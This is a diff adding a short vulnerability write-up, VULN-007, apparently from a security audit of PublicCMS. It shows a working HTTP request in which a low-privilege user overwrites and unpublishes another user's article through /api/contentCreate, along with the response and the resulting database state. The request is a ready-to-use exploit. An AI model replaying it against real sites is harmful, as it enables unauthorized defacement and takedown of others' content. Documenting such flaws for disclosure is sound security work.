@@ -1,0 +1,12 @@
+### VULN-007 — cross-user content tamper/unpublish via /api/contentCreate update branch
+### Preconditions (via admin): app authorized for contentCreate + app token; victim article
+### (owned by admin id=2, published status=1); attacker = low-priv user id=12 (token from /api/login).
+
+GET /api/contentCreate?id=<victim-content-id>&categoryId=14&modelId=article&title=PWNED_BY_ATTACKER_<S>&text=defaced_<S> HTTP/1.1
+Host: site2.dev.publiccms.com
+appToken: <app-token>
+authToken: <attacker-user-token>
+authUserId: 12
+
+### -> 200 {"result":"success","contentId":"<victim-content-id>"}
+### DB after: title=PWNED_BY_ATTACKER_<S>, status=2 (PEND, unpublished), user_id=2 (owner unchanged)
